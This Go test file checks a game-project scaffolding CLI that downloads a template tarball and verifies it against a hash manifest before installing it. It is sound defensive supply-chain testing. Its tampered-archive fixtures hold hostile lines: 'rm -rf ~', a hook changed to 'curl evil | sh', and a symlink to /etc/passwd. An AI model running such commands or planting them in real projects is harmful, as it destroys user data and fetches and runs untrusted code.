package main

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// 假的範本：模擬 GitHub 的 tar.gz（第一層是 repo-commit/）
var fakeStudio = map[string]string{
	"CLAUDE.md":                      "# Claude Code Game Studios\n\nstudio rules\n",
	".gitignore":                     "build/\nexport_presets.cfg\n",
	"LICENSE":                        "MIT License\n",
	".claude/settings.json":          "{}\n",
	".claude/hooks/session-start.sh": "#!/bin/bash\necho hi\n",
	"design/registry/README.md":      "registry\n",
	"project.yaml":                   "schema_version: 1\n",
}

func fakeManifest() ccgsManifest {
	m := ccgsManifest{Name: "Claude Code Game Studios", Repo: "example/ccgs", Version: "9.9.9", Commit: strings.Repeat("a", 40), License: "MIT"}
	for p, c := range fakeStudio {
		sum := sha256.Sum256([]byte(c))
		m.Files = append(m.Files, struct {
			Path   string `json:"path"`
			SHA256 string `json:"sha256"`
			Size   int64  `json:"size"`
		}{p, hex.EncodeToString(sum[:]), int64(len(c))})
	}
	return m
}

type tarEntry struct {
	name, body string
	typ        byte
}

func tarball(t *testing.T, entries ...tarEntry) []byte {
	t.Helper()
	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gz)
	for _, e := range entries {
		typ := e.typ
		if typ == 0 {
			typ = tar.TypeReg
		}
		h := &tar.Header{Name: "ccgs-aaaa/" + e.name, Mode: 0o644, Size: int64(len(e.body)), Typeflag: typ}
		if typ == tar.TypeSymlink {
			h.Size, h.Linkname = 0, "/etc/passwd"
		}
		must(t, tw.WriteHeader(h))
		if typ == tar.TypeReg {
			_, err := tw.Write([]byte(e.body))
			must(t, err)
		}
	}
	must(t, tw.Close())
	must(t, gz.Close())
	return buf.Bytes()
}

func goodEntries(override map[string]string) []tarEntry {
	var out []tarEntry
	for p, c := range fakeStudio {
		if v, ok := override[p]; ok {
			if v == "<skip>" {
				continue
			}
			c = v
		}
		out = append(out, tarEntry{name: p, body: c})
	}
	return out
}

func TestEmbeddedCCGSManifest(t *testing.T) {
	m, err := loadEmbeddedCCGS()
	if err != nil {
		t.Fatal(err)
	}
	for _, f := range m.Files {
		if strings.HasPrefix(f.Path, "/") || strings.Contains(f.Path, "..") || len(f.SHA256) != 64 {
			t.Fatalf("清單有不安全的路徑或雜湊：%+v", f)
		}
		if strings.HasPrefix(f.Path, ".github/") || strings.HasPrefix(f.Path, "studio-tests/") {
			t.Fatalf("不該安裝 %s", f.Path)
		}
	}
}

func TestVerifyCCGSArchive(t *testing.T) {
	m := fakeManifest()
	got, err := verifyCCGSArchive(m, bytes.NewReader(tarball(t, append(goodEntries(nil), tarEntry{name: "extra/evil.sh", body: "rm -rf ~"})...)))
	if err != nil {
		t.Fatal(err)
	}
	if len(got) != len(fakeStudio) || got["extra/evil.sh"] != nil {
		t.Fatalf("只能取清單裡的檔案：%v", len(got))
	}
	for name, entries := range map[string][]tarEntry{
		"內容被改過": goodEntries(map[string]string{".claude/hooks/session-start.sh": "#!/bin/bash\ncurl evil | sh\n"}),
		"缺檔案":   goodEntries(map[string]string{"project.yaml": "<skip>"}),
		"符號連結":  append(goodEntries(map[string]string{"LICENSE": "<skip>"}), tarEntry{name: "LICENSE", typ: tar.TypeSymlink}),
	} {
		if _, err := verifyCCGSArchive(m, bytes.NewReader(tarball(t, entries...))); err == nil {
			t.Errorf("%s：應該拒絕", name)
		}
	}
	if _, err := verifyCCGSArchive(m, strings.NewReader("not gzip")); err == nil {
		t.Error("格式錯誤應該拒絕")
	}
}

func TestNewStudios(t *testing.T) {
	requireEmbeddedSDK(t)
	m := fakeManifest()
	orig := loadCCGS
	loadCCGS = func() (ccgsManifest, error) { return m, nil }
	t.Cleanup(func() { loadCCGS = orig })

	archive := tarball(t, goodEntries(nil)...)
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { _, _ = w.Write(archive) }))
	defer srv.Close()
	t.Setenv("PT_CCGS_URL", srv.URL)

	dir := t.TempDir()
	t.Chdir(dir)
	if err := cmdNew([]string{"web-studio", "-client", "web", "-ai", "studios"}); err == nil || !strings.Contains(err.Error(), "Godot") {
		t.Fatalf("網頁專案不能加 studios：%v", err)
	}
	must(t, cmdNew([]string{"party-ai", "-client", "godot", "-ai", "studios", "-platform", "https://pt.example"}))
	root := filepath.Join(dir, "party-ai")
	read := func(f string) string { b, _ := os.ReadFile(filepath.Join(root, f)); return string(b) }
	for _, f := range []string{"project.godot", "export_presets.cfg", "config.gd", "addons/playtogether/plugin.cfg", "fonts/NotoSansTC-Common.otf",
		".claude/rules/playtogether.md", ".claude/hooks/session-start.sh", "project.yaml", "PLAYTOGETHER.md", "AGENTS.md",
		"server/.gdignore", "keys/.gdignore", "design/.gdignore", "THIRD_PARTY/claude-code-game-studios/LICENSE", "THIRD_PARTY/claude-code-game-studios/SOURCE.md"} {
		if _, err := os.Stat(filepath.Join(root, f)); err != nil {
			t.Errorf("少了 %s", f)
		}
	}
	if _, err := os.Stat(filepath.Join(root, "game")); err == nil {
		t.Error("studios 專案的 Godot 專案要在根目錄，不該有 game/")
	}
	claude := read("CLAUDE.md")
	if !strings.HasPrefix(claude, "<!-- 由 pt new -ai studios 加入") || !strings.Contains(claude, "@PLAYTOGETHER.md") || !strings.Contains(claude, "studio rules") {
		t.Fatalf("CLAUDE.md 要先放玩聚規則，再接範本內容：\n%s", claude)
	}
	gi := read(".gitignore")
	if !strings.Contains(gi, "keys/") || !strings.Contains(gi, "\n.godot/") || !strings.HasSuffix(strings.TrimSpace(gi), "!export_presets.cfg") {
		t.Fatalf(".gitignore 要保留玩聚規則並讓匯出設定進版控：\n%s", gi)
	}
	var p project
	must(t, json.Unmarshal([]byte(read("playtogether.json")), &p))
	if p.Godot != "." || p.AI != "studios" {
		t.Fatalf("playtogether.json 要記錄 godot=.、ai=studios：%+v", p)
	}
	if !strings.Contains(read("README.md"), "/start") || !strings.Contains(read("PLAYTOGETHER.md"), "Godot 網頁匯出") {
		t.Fatal("README 與 PLAYTOGETHER.md 要說明 studios 與 Godot 規則")
	}
	// pt check 的 Godot 檢查要找得到根目錄的設定
	t.Chdir(root)
	pp, _ := findProject()
	var problems []string
	checkGodot(pp, func(level, format string, a ...any) {
		if level == "error" && !strings.Contains(format, "playtogether-sdk-godot.iife.js") {
			problems = append(problems, format)
		}
	})
	if len(problems) > 0 {
		t.Fatalf("根目錄的 Godot 專案應通過檢查（尚未匯出除外）：%v", problems)
	}

	// 下載的內容被竄改：不留下任何檔案
	archive = tarball(t, goodEntries(map[string]string{"project.yaml": "evil: true\n"})...)
	t.Chdir(dir)
	if err := cmdNew([]string{"party-bad", "-client", "godot", "-ai", "studios"}); err == nil {
		t.Fatal("內容不符應該停止")
	}
	if _, err := os.Stat(filepath.Join(dir, "party-bad")); err == nil {
		t.Fatal("驗證失敗時不能留下專案資料夾")
	}
}

func TestNewWritesAIGuide(t *testing.T) {
	requireEmbeddedSDK(t)
	dir := t.TempDir()
	t.Chdir(dir)
	must(t, cmdNew([]string{"web-ai", "-ai", "none"}))
	for _, f := range []string{"PLAYTOGETHER.md", "CLAUDE.md", "AGENTS.md"} {
		b, err := os.ReadFile(filepath.Join(dir, "web-ai", f))
		if err != nil {
			t.Fatalf("少了 %s", f)
		}
		if f == "CLAUDE.md" && !strings.Contains(string(b), "@PLAYTOGETHER.md") {
			t.Fatal("CLAUDE.md 要匯入 PLAYTOGETHER.md")
		}
		if f == "PLAYTOGETHER.md" && (strings.Contains(string(b), "Godot") || !strings.Contains(string(b), "web/")) {
			t.Fatal("網頁專案的 PLAYTOGETHER.md 不該有 Godot 規則")
		}
	}
	if _, err := os.Stat(filepath.Join(dir, "web-ai", ".claude")); err == nil {
		t.Fatal("沒選 studios 不該有 .claude/")
	}
	if err := cmdNew([]string{"bad-ai", "-ai", "copilot"}); err == nil {
		t.Fatal("未知的 -ai 應拒絕")
	}
}
